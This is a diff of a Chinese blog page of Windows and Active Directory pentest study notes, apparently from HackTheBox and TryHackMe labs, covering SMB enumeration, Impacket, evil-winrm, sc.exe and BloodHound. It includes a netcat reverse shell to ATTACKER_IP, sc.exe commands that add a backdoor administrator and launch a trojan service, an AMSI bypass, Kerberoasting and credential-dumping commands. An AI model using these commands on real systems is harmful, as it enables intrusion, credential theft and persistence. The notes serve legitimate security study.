@@ -27,15 +27,13 @@
 <meta property="og:site_name" content="guayu-kakeru">
 <meta property="og:description" content="windows工具笔记">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://guayu-kakeru.github.io/Windows%E7%9F%A5%E8%AF%86.assets/image-20251016193419041.png">
 <meta property="article:published_time" content="2025-11-23T02:41:13.000Z">
-<meta property="article:modified_time" content="2026-04-07T11:36:52.675Z">
+<meta property="article:modified_time" content="2026-04-07T12:06:50.148Z">
 <meta property="article:author" content="guayu-kakeru">
+<meta property="article:tag" content="笔记">
 <meta property="article:tag" content="操作系统">
 <meta property="article:tag" content="工具">
-<meta property="article:tag" content="笔记">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://guayu-kakeru.github.io/Windows%E7%9F%A5%E8%AF%86.assets/image-20251016193419041.png">
 
 <link rel="canonical" href="https://guayu-kakeru.github.io/posts/3265.html">
 
@@ -228,7 +226,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2026-04-07 19:36:52" itemprop="dateModified" datetime="2026-04-07T19:36:52+08:00">2026-04-07</time>
+                <time title="修改时间：2026-04-07 20:06:50" itemprop="dateModified" datetime="2026-04-07T20:06:50+08:00">2026-04-07</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -258,8 +256,561 @@
       
         <p>windows工具笔记</p>
 <span id="more"></span>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/fVTLV_SDwMFM7tN8d60v7w?clicktime=1754973418&enterid=1754973418&scene=126&sessionid=1754973406&subscene=7">渗透需要知道的知识和名词总结</a><br>内网所在网段：10.0.0.0—10.255.255.255，172.16.0.0—172.31.255.255，192.168.0.0—192.168.255.255<br>windows机器的flag常用位置： C:&#x2F;USERS&#x2F;ADMINISTRATOR&#x2F;FLAG&#x2F;<br>windows有两种常见的提权 <a target="_blank" rel="noopener" href="https://github.com/BeichenDream/BadPotato">badpotato</a>和 <a target="_blank" rel="noopener" href="https://github.com/uknowsec/SweetPotato">sweetpotato</a><br>该提权手法的前提是拥有SeImpersonatePrivilege或SeAssignPrimaryTokenPrivilege权限，以下用户拥有SeImpersonatePrivilege权限（而只有更高权限的账户比如SYSTEM才有SeAssignPrimaryTokenPrivilege权限）：<br>本地管理员账户（不包括管理员组普通账户）和本地服务帐户<br>由SCM启动的服务</p><h2 id="常用命令-与Linux对照"><a href="#常用命令-与Linux对照" class="headerlink" title="常用命令 与Linux对照"></a>常用命令 与Linux对照</h2><p>systeminfo  &#x3D;   uname -a<br>type    &#x3D;    cat<br><code>dir /s /b c:\*pass*.*</code>  &#x3D; <code>find / -r -name &quot;*pass*&quot;</code>  &#x2F;s表示递归搜索，&#x2F;b表示只显示路径。</p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>通常我们需要先枚举共享、检查权限，然后下载敏感文件（如包含 GPP 密码的 <code>Groups.xml</code>）</p><h3 id="smbclient"><a href="#smbclient" class="headerlink" title="smbclient"></a>smbclient</h3><p>Samba 套件中的核心工具，提供了一个类似 FTP 的交互式命令行界面</p><table><thead><tr><th><strong>参数</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td><code>-L &lt;IP&gt;</code></td><td><strong>List</strong>。列出目标主机上可用的共享列表。</td></tr><tr><td><code>-U &lt;user&gt;%&lt;pass&gt;</code></td><td>指定用户名和密码。格式为 <code>用户名%密码</code>。</td></tr><tr><td><code>-N</code></td><td><strong>No pass</strong>。尝试空会话（匿名）登录，不询问密码。</td></tr><tr><td><code>-I &lt;IP&gt;</code></td><td>指定目标 IP（在 DNS 解析失败时很有用）。</td></tr><tr><td><code>-c &quot;&lt;command&gt;&quot;</code></td><td>非交互模式执行命令（适合脚本调用）。</td></tr><tr><td><code>-W</code></td><td><strong>Workgroup&#x2F;Domain (域&#x2F;工作组)</strong>。</td></tr><tr><td>example use:</td><td></td></tr></tbody></table><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NGINX"><figure class="iseeu highlight /nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 尝试匿名列出共享</span></span><br><span class="line"><span class="attribute">smbclient</span> -L <span class="number">10.10.10.100</span> -N</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用已知凭据列出共享</span></span><br><span class="line">smbclient -L <span class="number">10.10.10.100</span> -U <span class="string">&quot;SVC_TGS%GPPstillStandingStrong2k18&quot;</span></span><br></pre></td></tr></table></figure></div><p><strong>下载敏感文件 (GPP 利用)</strong> 在交互式界面 (<code>smb: \&gt;</code>) 中操作：</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">smb: \&gt; recurse ON       <span class="comment"># 开启递归模式（如果要下载文件夹）</span></span><br><span class="line">smb: \&gt; prompt OFF       <span class="comment"># 关闭确认提示（下载大量文件时不询问）</span></span><br><span class="line">smb: \&gt; <span class="built_in">cd</span> active.htb\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Groups</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span>               <span class="comment"># 查看文件</span></span><br><span class="line">smb: \&gt; get Groups.xml   <span class="comment"># 下载 GPP 配置文件</span></span><br></pre></td></tr></table></figure></div><h3 id="smbmap"><a href="#smbmap" class="headerlink" title="smbmap"></a>smbmap</h3><p>一款基于 Python 的轻量级 SMB 枚举工具。<br>快速概览。它可以一次性扫描所有共享的<strong>读写权限</strong>。</p><table><thead><tr><th><strong>参数</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td><code>-H &lt;IP&gt;</code></td><td>指定目标主机 IP。</td></tr><tr><td><code>-u &lt;user&gt;</code></td><td>指定用户名（如果不指定，默认尝试空用户）。</td></tr><tr><td><code>-p &lt;pass&gt;</code></td><td>指定密码。</td></tr><tr><td><code>-R</code></td><td><strong>Recursive</strong>。递归列出目录下的所有文件。</td></tr><tr><td><code>--download &lt;path&gt;</code></td><td>下载远程文件到本地。</td></tr><tr><td><code>--upload &lt;src&gt; &lt;dst&gt;</code></td><td>上传文件到远程服务器。</td></tr><tr><td><code>-A</code></td><td>下载匹配到的文件 可正则</td></tr><tr><td><code>-d</code></td><td>指定域名</td></tr><tr><td><code>smbmap -d active.htb -H 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18</code></td><td></td></tr></tbody></table><h2 id="python3-impacket"><a href="#python3-impacket" class="headerlink" title="python3-impacket"></a>python3-impacket</h2><p>这个是一个ptyhon包 可以用低级语言 访问对windows的网络协议的底层访问 核心功能通过一系列的脚本实现<br>主要功能包括<br>使用的时候要设置一下环境变量 &#x2F;usr&#x2F;share&#x2F;doc&#x2F;python3-impacket&#x2F;examples</p><h3 id="Impacket常用脚本功能一览表"><a href="#Impacket常用脚本功能一览表" class="headerlink" title="Impacket常用脚本功能一览表"></a>Impacket常用脚本功能一览表</h3><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>功能分类</td><td>脚本名称 (Script Name)</td><td>主要作用 (Primary Function)</td></tr><tr><td><strong>远程命令执行</strong></td><td>psexec.py</td><td>通过在目标系统上创建并运行一个服务来获取半交互式shell。</td></tr><tr><td></td><td>smbexec.py</td><td>类似于psexec.py，但通过本地SMB服务器接收命令输出，灵活性更高。</td></tr><tr><td></td><td>wmiexec.py</td><td>利用Windows管理规范（WMI）执行命令，更为隐蔽，无需安装服务。</td></tr><tr><td></td><td>atexec.py</td><td>通过在目标系统上创建计划任务来执行命令。</td></tr><tr><td></td><td>dcomexec.py</td><td>使用不同的DCOM端点来执行命令，提供半交互式shell。</td></tr><tr><td><strong>凭据窃取与转储</strong></td><td>secretsdump.py</td><td>远程转储目标系统的各类凭据，包括SAM&#x2F;LSA Secrets、NTDS.dit数据库等。<br><code>secretsdump.py -ntds xxx/ntds.dit -system register/SYSTEM LOCAL</code><br><code>secretdump.py --hashes &#39;&#39; &#39;htb.local/APT$@htb.local&#39;</code>这是得到ntlmv1之后的hash转储机器上的hash</td></tr><tr><td></td><td>mimikatz.py</td><td>远程控制目标机器上的Mimikatz RPC服务器以提取明文密码和哈希。</td></tr><tr><td><strong>横向移动与权限提升</strong></td><td>ntlmrelayx.py</td><td>执行NTLM中继攻击，将捕获到的认证信息中继给其他服务以执行操作。</td></tr><tr><td></td><td>GetUserSPNs.py</td><td>执行Kerberoasting攻击，请求服务票据并离线破解以获取服务账户密码。</td></tr><tr><td></td><td>ticketer.py</td><td>用于创建黄金票据（Golden Tickets）和白银票据（Silver Tickets），实现域控持久化。</td></tr><tr><td></td><td>GetTGT.py</td><td>给定密码&#x2F;哈希&#x2F;aesKey，为指定用户请求Kerberos的票据授予票据（TGT）。</td></tr><tr><td><strong>网络服务交互与信息收集</strong></td><td>smbserver.py</td><td>快速搭建一个SMB服务器，用于文件传输或捕获客户端的Net-NTLM哈希。</td></tr><tr><td></td><td>smbclient.py</td><td>一个通用的SMB客户端，可以列出共享、上传&#x2F;下载文件、执行远程命令等。</td></tr><tr><td></td><td>rpcdump.py</td><td>枚举远程主机的RPC端点和接口信息，帮助发现可利用的服务。</td></tr><tr><td></td><td>rpcmap.py</td><td>爆破rpc端口和服务<br><code>rpcmap.py -brute-uuids -brute-opnums</code></td></tr><tr><td></td><td>lookupsid.py</td><td>通过MSRPC接口暴力破解Windows SID，从而发现远程系统的用户和组信息。</td></tr></tbody></table><h3 id="GetADUsers-py"><a href="#GetADUsers-py" class="headerlink" title="GetADUsers.py"></a>GetADUsers.py</h3><p>属于强大的 <strong>Impacket</strong> 套件。这是一个基于 Python 的脚本，用于通过 LDAP 协议向域控制器（DC）查询并枚举域内的所有用户账户。 (可以在拿到一个用户的凭据之后，使用这个工具枚举)</p><table><thead><tr><th><strong>参数</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td><code>-all</code></td><td><strong>强烈推荐</strong>。不仅仅列出用户名，还加载额外的属性（如：<strong>描述&#x2F;Description</strong>、上次密码设置时间、邮箱等）。</td></tr><tr><td><code>-dc-ip &lt;IP&gt;</code></td><td>指定域控制器的 IP 地址（如果在 <code>/etc/hosts</code> 里没配置好 DNS，这个参数必填）。</td></tr><tr><td><code>&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;</code></td><td>认证格式。必须提供有效的域凭据才能查询 LDAP。</td></tr><tr><td><code>python3 GetADUsers.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -all</code></td><td></td></tr></tbody></table><h3 id="GetUserSPNs-py"><a href="#GetUserSPNs-py" class="headerlink" title="GetUserSPNs.py"></a>GetUserSPNs.py</h3><p>它的核心功能是自动化地向域控制器发送 TGS（Ticket Granting Service）票据请求，并收集加密后的票据 Hash。</p><table><thead><tr><th><strong>参数</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td><code>&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;</code></td><td><strong>认证信息</strong>。必须使用有效的域用户和密码。</td></tr><tr><td><code>-request</code></td><td><strong>【核心】</strong> 告知脚本不仅要列出 SPN，还要向 DC <strong>请求 (Request)</strong> TGS 票据。<strong>不加此参数则不会获取 Hash。</strong></td></tr><tr><td><code>-dc-ip &lt;IP&gt;</code></td><td>指定域控制器的 IP 地址，避免 DNS 解析问题。</td></tr><tr><td><code>-t &lt;Target User&gt;</code></td><td>(可选) 如果你只想针对特定账户进行 Kerberoasting，可以使用此参数。</td></tr></tbody></table><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 语法：GetUserSPNs.py 域名/用户:密码 -request -dc-ip 目标IP</span></span><br><span class="line">python3 GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -dc-ip 10.10.10.100</span><br></pre></td></tr></table></figure></div><h2 id="横向移动工具"><a href="#横向移动工具" class="headerlink" title="横向移动工具"></a>横向移动工具</h2><h3 id="evil-winrm"><a href="#evil-winrm" class="headerlink" title="evil-winrm"></a>evil-winrm</h3><p>基于 WinRM 协议的工具 (端口: 5985&#x2F;HTTP, 5986&#x2F;HTTPS)<br>用来尝试用户的账号密码（哈希）是否可以登录<br>–ip &#x2F; -i : 目标 IP<br>–user &#x2F; -u : 用户名<br>–password &#x2F; -p : 密码<br>–hash &#x2F; -H : NTLM hash（pass-the-hash）<br>–port &#x2F; -P : 指定端口（5985 HTTP，5986 HTTPS）<br>–ssl &#x2F; -S : 使用 SSL&#x2F;TLS 连接<br><code>evil-winrm -u administrator -H hash -i htb.local</code><br>进入shell之后menu会展示可用的功能</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>功能 (Feature)</td><td>类型 (Type)</td><td>描述 (Description)</td></tr><tr><td><strong>DLL-Loader</strong></td><td>内存执行</td><td>将本地的 DLL 文件反射式地注入到远程主机的内存中执行，实现无文件攻击。</td></tr><tr><td><strong>Donut-Loader</strong></td><td>内存执行</td><td>利用 Donut 技术将本地二进制文件 (EXE&#x2F;DLL等) 转换成 Shellcode，并在远程内存中执行，具有优秀的免杀效果。</td></tr><tr><td><strong>Invoke-Binary</strong></td><td>内存执行</td><td>将本地的 EXE 可执行文件加载到远程 PowerShell 进程的内存中并运行，避免在磁盘上留下文件。</td></tr><tr><td><strong>Bypass-4MSI</strong></td><td>安全绕过</td><td>禁用当前 PowerShell 会话中的 AMSI (反恶意软件扫描接口)，为执行已知恶意脚本 (如 Mimikatz) 扫清障碍。</td></tr><tr><td><strong>services</strong></td><td>系统管理</td><td>提供了远程管理 (查询、启动、停止) Windows 服务的功能，用于信息搜集或权限维持。</td></tr><tr><td><strong>upload</strong></td><td>文件传输</td><td>将本地攻击机上的文件上传到目标机器。</td></tr><tr><td><strong>download</strong></td><td>文件传输</td><td>从目标机器下载文件到本地攻击机。</td></tr><tr><td><strong>menu</strong></td><td>内置命令</td><td>显示此功能菜单列表。</td></tr><tr><td><strong>exit</strong></td><td>内置命令</td><td>关闭并退出当前的 evil-winrm 会话。</td></tr></tbody></table><h3 id="psexec-py"><a href="#psexec-py" class="headerlink" title="psexec.py"></a>psexec.py</h3><p>在impacket包中</p><ul><li><strong>工作原理</strong>: 通过 SMB 协议连接到目标的 ADMIN$ 共享，上传一个恶意的服务程序（二进制文件），然后通过 RPC 调用远程创建并启动这个服务，从而获得一个交互式的 Shell。</li></ul><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">impacket-psexec -hashes &lt;<span class="title class_">LM_HASH</span>&gt;<span class="symbol">:&lt;NT_HASH&gt;</span> &lt;<span class="title class_">USERNAME</span>&gt;@&lt;<span class="title class_">TARGET_IP</span>&gt; </span><br><span class="line"><span class="comment"># 通常 LM_HASH 是空的，所以是 aad3b435b51404eeaad3b435b51404ee:&lt;NT_HASH&gt;</span></span><br><span class="line"> impacket-psexec -hashes <span class="symbol">:&lt;NT_HASH&gt;</span> <span class="title class_">DOMAIN</span>/<span class="title class_">USERNAME</span>@&lt;<span class="title class_">TARGET_IP</span>&gt; <span class="string">&#x27;whoami&#x27;</span></span><br></pre></td></tr></table></figure></div><p><code>psexec.py active.htb/svc_tgs@10.10.10.100</code></p><h3 id="smbexec"><a href="#smbexec" class="headerlink" title="smbexec"></a>smbexec</h3><ul><li><strong>工作原理</strong>: 与 PsExec 类似，也是通过 RPC 创建服务。但它不上传二进制文件，而是执行一个命令，并将输出重定向到一个 SMB 共享的文本文件中，然后本地读取这个文件内容。<br><code>impacket-smbexec -hashes :&lt;NT_HASH&gt; USERNAME@&lt;TARGET_IP&gt;</code></li></ul><h3 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h3><ul><li><strong>工作原理</strong>: 利用 Windows Management Instrumentation (WMI) 来执行命令。它通过 DCOM&#x2F;RPC (端口 135 及动态端口) 进行通信。<br><code>impacket-wmiexec -hashes :&lt;NT_HASH&gt; DOMAIN/USERNAME@&lt;TARGET_IP&gt;</code></li></ul><h3 id="runas"><a href="#runas" class="headerlink" title="runas"></a>runas</h3><p>Windows 系统内置工具，允许用户以与其他用户（如 Administrator）不同的权限运行特定的工具或程序。<br>比如psexec没有开Admin共享目录的时候，就可以用一个windows攻击机</p><table><thead><tr><th><strong>参数</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td><code>/user:&lt;UserAccount&gt;</code></td><td>指定要模拟的用户名。格式通常为 <code>域名\用户名</code> 或 <code>计算机名\用户名</code>。</td></tr><tr><td><code>/savecred</code></td><td><strong>(渗透重点)</strong> 如果之前保存过凭据，使用此参数可直接以该用户身份运行，无需输入密码。这是常见的提权漏洞点。</td></tr><tr><td><code>/noprofile</code></td><td>不加载用户的配置文件（加载配置文件可能会很慢或在某些 Shell 中出错）。</td></tr><tr><td><code>/netonly</code></td><td><strong>(高级技巧)</strong> 仅在访问网络资源时使用指定的凭据。本地仍是当前用户。常用于“哈希传递”或跨域攻击。</td></tr><tr><td><code>runas /netonly /user:active.htb\svc_tgs cmd</code></td><td></td></tr><tr><td><code>C:\&gt; runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers &quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443&quot;</code> (适合在一个跳板机上执行，因为没法弹出新的端口，所以用一个反弹shell 到攻击机上面)</td><td></td></tr></tbody></table><h3 id="sc-exe"><a href="#sc-exe" class="headerlink" title="sc.exe"></a>sc.exe</h3><p>用来创建和管理服务的一个工具 <a href="THM-AD.md#Remotely%20Creating%20Services%20Using%20sc">Remotely Creating Services Using sc</a></p><ul><li><strong>Ports:</strong><ul><li>135&#x2F;TCP, 49152-65535&#x2F;TCP (DCE&#x2F;RPC)</li><li>445&#x2F;TCP (RPC over SMB Named Pipes)</li><li>139&#x2F;TCP (RPC over SMB Named Pipes)</li></ul></li></ul><table><thead><tr><th><strong>参数</strong></th><th><strong>说明</strong></th><th><strong>攻击场景</strong></th></tr></thead><tbody><tr><td><strong><code>\\TARGET_IP</code></strong></td><td>指定远程目标机器</td><td><strong>横向移动</strong>的核心。如果不加这个，就是操作本机。</td></tr><tr><td><strong><code>create</code></strong></td><td>创建一个新的服务</td><td>注册后门服务。</td></tr><tr><td><strong><code>start</code></strong></td><td>立即启动某个服务</td><td>触发 Payload 执行。</td></tr><tr><td><strong><code>stop</code></strong></td><td>停止某个服务</td><td>关闭杀毒软件或防火墙服务。</td></tr><tr><td><strong><code>delete</code></strong></td><td>删除服务</td><td>攻击结束后<strong>清理痕迹</strong>。</td></tr><tr><td><strong><code>query</code></strong></td><td>查询服务状态</td><td>枚举目标机器运行的安全软件。</td></tr><tr><td><strong><code>config</code></strong></td><td>修改现有服务配置</td><td><strong>提权</strong> (PrivEsc)，例如修改 <code>binPath</code> 指向木马。</td></tr></tbody></table><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rem <span class="number">1</span>. 注册服务 (注意 binPath= 后的空格)</span><br><span class="line"><span class="built_in">sc</span> \\<span class="number">192.168</span>.<span class="number">1.50</span> create BackdoorUser binPath= <span class="string">&quot;net user hacker P@ss123 /add&quot;</span> <span class="built_in">start</span>= auto</span><br><span class="line"></span><br><span class="line">rem <span class="number">2</span>. 把用户加入管理员组 (需要修改 binPath 再次利用，或创建新服务)</span><br><span class="line"><span class="built_in">sc</span> \\<span class="number">192.168</span>.<span class="number">1.50</span> config BackdoorUser binPath= <span class="string">&quot;net localgroup administrators hacker /add&quot;</span></span><br><span class="line"></span><br><span class="line">rem <span class="number">3</span>. 启动服务 (触发执行)</span><br><span class="line"><span class="built_in">sc</span> \\<span class="number">192.168</span>.<span class="number">1.50</span> <span class="built_in">start</span> BackdoorUser</span><br></pre></td></tr></table></figure></div><p>反弹shell：</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rem <span class="number">1</span>. 注册服务指向木马路径</span><br><span class="line"><span class="built_in">sc</span> \\<span class="number">192.168</span>.<span class="number">1.50</span> create ShellService binPath= <span class="string">&quot;C:\Windows\Temp\shell.exe&quot;</span></span><br><span class="line"></span><br><span class="line">rem <span class="number">2</span>. 启动</span><br><span class="line"><span class="built_in">sc</span> \\<span class="number">192.168</span>.<span class="number">1.50</span> <span class="built_in">start</span> ShellService</span><br></pre></td></tr></table></figure></div><p>清理痕迹：</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sc</span> \\<span class="number">192.168</span>.<span class="number">1.50</span> stop BackdoorUser</span><br><span class="line"><span class="built_in">sc</span> \\<span class="number">192.168</span>.<span class="number">1.50</span> delete BackdoorUser</span><br></pre></td></tr></table></figure></div><h3 id="winrs-exe"><a href="#winrs-exe" class="headerlink" title="winrs.exe"></a>winrs.exe</h3><p>winrs.exe 是 Windows 自带的远程命令行工具，它是 WinRM (Windows Remote Management) 服务的客户端。<br><strong>协议与端口</strong>: 依赖 WinRM 服务，默认使用 <strong>TCP 5985</strong> (HTTP) 或 <strong>TCP 5986</strong> (HTTPS)。</p><table><thead><tr><th><strong>参数</strong></th><th><strong>说明</strong></th><th><strong>备注</strong></th></tr></thead><tbody><tr><td><strong><code>-r:TARGET</code></strong></td><td><strong>Remote</strong>。指定远程目标机器的 IP 或主机名。</td><td>格式可以是 <code>-r:IP</code> 或 <code>-r:https://URL</code>。</td></tr><tr><td><strong><code>-u:USERNAME</code></strong></td><td><strong>User</strong>。指定登录用户名。</td><td>如果当前会话已经有票据&#x2F;凭证（如 PtH 后），<strong>可省略此参数</strong>。</td></tr><tr><td><strong><code>-p:PASSWORD</code></strong></td><td><strong>Password</strong>。指定密码。</td><td>同上，若已注入凭证可省略。</td></tr><tr><td><strong><code>-d:PATH</code></strong></td><td><strong>Directory</strong>。指定启动时的初始目录。</td><td>默认是 <code>C:\Users\用户名</code>。</td></tr><tr><td><strong><code>CMD</code></strong></td><td><strong>Command</strong>。最后跟上要执行的指令。</td><td>通常直接写 <code>cmd</code> 来获得一个交互式 Shell。</td></tr></tbody></table><h2 id="gpp-decrypt"><a href="#gpp-decrypt" class="headerlink" title="gpp-decrypt"></a>gpp-decrypt</h2><p>这是一个专门用于解密 Windows <strong>Group Policy Preferences (GPP)</strong> 中加密密码的轻量级工具（通常是用 Ruby 编写的脚本）。<br>微软以前允许管理员通过组策略（GPP）批量修改本地管理员密码或创建用户。这些密码被加密后存储在 <code>Groups.xml</code> 等文件中。<br>你需要复制 <code>cpassword</code> 引号里面的这串乱码。</p><h2 id="bloodhound"><a href="#bloodhound" class="headerlink" title="bloodhound"></a>bloodhound</h2><p>一款基于图数据库（Neo4j）的可视化工具，用于分析 Active Directory (AD) 域内的信任关系。</p><p>它能帮你找出从“当前低权限用户”到“域管理员”的最短路径（例如：用户A -&gt; 可以在电脑B上登录 -&gt; 电脑B缓存了管理员C的凭据 -&gt; 管理员C是域管）。</p><h3 id="靶机端"><a href="#靶机端" class="headerlink" title="靶机端"></a>靶机端</h3><table><thead><tr><th><strong>参数</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td><code>-u &lt;username&gt;</code></td><td>用户名。</td></tr><tr><td><code>-p &lt;password&gt;</code></td><td>密码。</td></tr><tr><td><code>-d &lt;domain&gt;</code></td><td>域名 (如 <code>active.htb</code>)。</td></tr><tr><td><code>-ns &lt;IP&gt;</code></td><td><strong>Name Server</strong>。指定域控 IP 作为 DNS 服务器（防止 Kali 解析不了内部域名）。</td></tr><tr><td><code>-c All</code></td><td><strong>Collection Method</strong>。收集所有信息（组成员、会话、ACL、信任关系等）。推荐用这个。</td></tr><tr><td><code>--zip</code></td><td>将收集到的 JSON 文件自动打包成 ZIP（方便拖入 GUI）。</td></tr><tr><td>使用方式：</td><td></td></tr><tr><td>在kali中  cd &#x2F;ope&#x2F;bloodhound&#x2F;Ingestors  开一个python的http服务</td><td></td></tr><tr><td>在登录的windows的环境中，下载SharpHound.exe</td><td></td></tr><tr><td><code>.\SharpHound -d active.htb -c all --domaincontroller 10.10.10.100 </code></td><td></td></tr><tr><td>如果找不到域：</td><td></td></tr><tr><td>控制面板： <strong>“网络和 Internet” (Network and Internet)</strong> -&gt; <strong>“网络和共享中心” (Network and Sharing Center)</strong>。 –&gt; 更改适配器设置  <strong>右键</strong>点击确认好的那个网卡，选择 <strong>“属性”</strong> 在列表中找到并双击 <strong>“Internet 协议版本 4 (TCP&#x2F;IPv4)”</strong>。 修改DNS</td><td></td></tr><tr><td>或者： C:\Windows\System32\drivers\etc\ 选择 <strong><code>hosts</code></strong> 文件并打开。 加上<code>10.10.10.100 active.htb</code></td><td></td></tr></tbody></table><h3 id="攻击端"><a href="#攻击端" class="headerlink" title="攻击端"></a>攻击端</h3><p><code>neo4j start</code><br><code>./bloodhound</code><br>示例用法： 在Active这个靶机中， 利用了Kerberoast(是一种利用 <strong>Kerberos 协议设计缺陷</strong>的攻击方式，允许任何<strong>有效的域用户</strong>（即使是最低权限的用户，如你拿到的 <code>SVC_TGS</code> 账号）向域控制器请求一张特殊的 <strong>服务票据</strong>（TGS Ticket），然后离线破解这张票据以获取<strong>服务账户的明文密码</strong>。)<br>Shortest Paths from Kerberonstable Users 在这里发现有Administrator 然后用GetUserSPNs.py 得到hash破解</p><h2 id="windows-安全认证"><a href="#windows-安全认证" class="headerlink" title="windows 安全认证"></a>windows 安全认证</h2><p><a href="../%E7%9F%A5%E8%AF%86%E9%9A%8F%E8%AE%B0/Tryhackme%20Learning%20note.md#Authentication%20Methods">Authentication Methods</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/hVoSCpIVvtDSGW8h3V06Cw">安全认证机制</a><br>主要有NTLM 和 Kerberos<br>在Windows系统导出密码的时候，经常看到这样的密码格式<br><code>Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::</code></p><ul><li>AAD3B435B51404EEAAD3B435B51404EE是LM Hash</li><li>31D6CFE0D16AE931B73C59D7E0C089C0是NTLM Hash<br>LM Hash的本质是DES加密，但是现在基本都已经没有使用LM Hash</li></ul><p>kerberos:  协议端口88<br>Kerberos协议的侧重在于认证通信双方的身份，客户端需要确认即将访问的网络服务就是自己所想要访问的服务而不是一个伪造的服务器，而服务端需要确认这个客户端是一个身份真实，安全可靠的客户端，而不是一个想要进行恶意网络攻击的用户。<br>kerberos组成</p><ul><li>客户端(Client)：发送请求的一方</li><li>服务端(Server)：接收请求的一方</li><li>密钥分发中心(Key distribution KDC)<br>密钥分发中心又分为两个部分，分别是：</li><li>AS(Authentication Server)：认证服务器，专门用来认证客户端的身份并发放客户用于访问TGS的TGT(票据授予票据)，主要是接收客户端的请求</li><li>TGS(Ticket Granting ticket)：票据授予服务器，用来发放整个认证过程以及客户端访问服务端时所需的服务授予票据(ticket)<br>整个流程可简化为三步：</li><li>客户端向AS请求，证明自己身份，并且表明自己想要访问什么服务，AS核实身份之后会向客户端发送TGT</li><li>客户端拿到TGT之后访问TGS，TGS核实客户端的TGT之后，会向客户端发送ST</li><li>最后客户端拿着ST去访问想要访问的服务<br>在域渗透中，黄金票据就是伪造TGT,白银票据就是伪造ST</li></ul><p>windows本机内是不存储明文密码的，只存储Hash值，本机用户的密码hash是放在本地的SAM文件里面，域内用户的密码hash是存在域控的NTDS.DIT文件里面<br>SAM文件的路径：C:\Windows\System32\config\SAM</p><h3 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h3><ol><li>通过winlogon.exe获取用户输入的用户名与密码</li><li>winlogon.exe将密码传递给lsass.exe，lsass.exe负责将密码进行加密为NTLM Hash</li><li>将lsass.exe加密的NTLM Hash与本地SAM文件里面的NTLM Hash进行比较，如果相同则将User SID,Group SID发送给winlogon.exe，否则登入失败</li></ol><h2 id="crackmapexec"><a href="#crackmapexec" class="headerlink" title="crackmapexec"></a>crackmapexec</h2><p>用于批量枚举、凭证测试、横向移动和自动化利用（SMB&#x2F;LDAP&#x2F;RDP&#x2F;WinRM 等）<br><code>crackmapexec smb htb.local -u userlist.txt -H hash</code><br>它的下一代版本是 nxc </p><h2 id="mimikatz"><a href="#mimikatz" 